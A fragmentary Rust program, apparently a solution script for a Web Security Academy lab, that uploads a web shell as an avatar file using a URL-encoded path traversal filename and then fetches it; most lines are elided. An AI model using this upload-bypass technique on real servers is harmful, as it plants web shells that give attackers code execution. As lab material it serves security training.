...
const LAB_URL: &str = "https://0a1300f104b42b98801e67f6009c003a.web-security-academy.net";
...
fn main() {
    ...
    println!("{}", "OK".green());
    print!("⦗5⦘ Uploading the shell file via path traversal.. ");
    ...
    let avatar = build_avatar(shell_file, &format!("%2e%2e%2f{shell_file_name}"));
    ...
    let uploaded_file = fetch_with_session(&format!("/files/{shell_file_name}"), &session);
